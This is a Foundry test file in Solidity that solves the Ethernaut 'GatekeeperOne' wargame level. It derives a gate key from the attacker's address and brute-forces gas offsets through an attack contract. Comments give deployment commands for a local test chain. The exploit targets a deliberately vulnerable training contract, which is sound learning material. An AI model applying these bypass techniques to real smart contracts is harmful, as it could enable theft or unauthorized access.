// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.0;

import "forge-std/Test.sol";
import "../src/levels/GatekeeperOne/GatekeeperOne.sol";
import "../src/levels/GatekeeperOne/GatekeeperOneFactory.sol";
import "../src/attack/GatekeeperOneAttack.sol";

contract GatekeeperOneTest is Test {
    GatekeeperOneFactory public factory;
    GatekeeperOne public instance;
    GatekeeperOneAttack public attack;
    address public player = address(0x01);
    // 0x1804c8AB1F12E6bbf3894d4083f33e07309d1f38 is the default tx.origin that foundry uses
    // if we spin up anvil, and we can use different address in the place of <Desired_Account>
    // $ forge create --private-key $PRIVATE_KEY test/GatekeeperOne.t.sol:GatekeeperOneTest
    // $ cast send --private-key $PRIVATE_KEY <GatekeeperOne_Address> "setUp()"
    // $ cast send --private-key $PRIVATE_KEY --from <Desired_Account> <GatekeeperOne_Address> "testGatekeeperOneAttack()"
    address public attacker = 0x1804c8AB1F12E6bbf3894d4083f33e07309d1f38;
    bytes8 internal key;

    function setUp() public {
        factory = new GatekeeperOneFactory();
        instance = GatekeeperOne(factory.createInstance(player));
        attack = new GatekeeperOneAttack();

        uint16 k16 = uint16(uint160(attacker));
        uint64 k64 = uint64(1 << 63) + uint64(k16);

        key = bytes8(k64);

        assert(uint32(uint64(key)) == uint16(uint64(key)));
        assert(uint32(uint64(key)) != uint64(key));
        assert(uint32(uint64(key)) == uint16(attacker));
    }

    function testGatekeeperOneAttack() public {
        for (uint256 i = 0; i < 8191; i++) {
            try attack.attack(address(instance), key, i) {
                log_uint(i);
            } catch {}
        }

        log_address(attacker);
        log_address(instance.entrant());
        assertTrue(factory.validateInstance((payable(address(instance))), attacker));
    }
}
